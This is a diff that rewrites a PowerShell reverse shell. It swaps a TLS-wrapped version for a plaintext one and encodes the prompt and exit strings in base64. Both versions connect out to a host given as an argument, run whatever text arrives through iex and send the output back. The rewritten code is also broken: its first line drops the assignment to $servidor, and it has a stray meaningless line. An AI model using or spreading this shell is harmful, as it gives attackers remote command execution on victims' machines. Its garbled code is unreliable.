@@ -1,17 +1,20 @@
-$servidor = new-object System.Net.Sockets.TcpClient($args[0],$args[1]);
+System.Net.Sockets.TcpClient($args[0],$args[1]);
 if($servidor -eq $null){exit 1}
 $transferencia = $servidor.GetStream();
-$SSL = New-Object System.Net.Security.SslStream($transferencia,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));
-$SSL.AuthenticateAsClient('fake.com', $null, "Tls12", $false);
-$Escribir = new-object System.IO.StreamWriter($SSL);
+$Escribir = new-object System.IO.StreamWriter($transferencia);
 $Bfr = new-object System.Byte[] 1024;
-$Escribir.Write('PS ' + (pwd).Path + '> ')
-$Escribir.flush()
-while(($i = $SSL.Read($Bfr, 0, $Bfr.Length)) -ne 0)
-{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bfr,0, $i);
-$SB = (iex $data | Out-String ) 2>&1;
-$SB2 = $SB + 'PS ' + (pwd).Path + '> ';
-$sendbyte = ([text.encoding]::ASCII).GetBytes($SB2);
-$SSL.Write($sendbyte,0,$sendbyte.Length);$SSL.Flush()}
+$Encoding = new-object System.Text.AsciiEncoding;
+do{        
+        $Escribir.Write($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAD4AIAA='))));
+        $Escribir.Flush();
+        $Lectura = $null;
+        while($transferencia.DataAvailable  -or ($Lectura = $transferencia.Read($Bfr, 0, 1024)) -eq $null){}
+        $ReciMens = ($Encoding, $Bfr, 0)
+        $data = $Encoding.GetString($Bfr, 0, $Lectura)
+        $SB = (iex $data 2>&1 | Out-String );
+        $directorio  = $SB + (pwd).Path + '> ';
+        $SB2  = $SB;
+        $sendbyte = ($Encoding).GetBytes($directorio);
+        $Escribir.Write($sendbyte,0,$sendbyte.Length);
+}While (!$data.equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AGkAdAA=')))))
 $Escribir.close();$servidor.close();
-
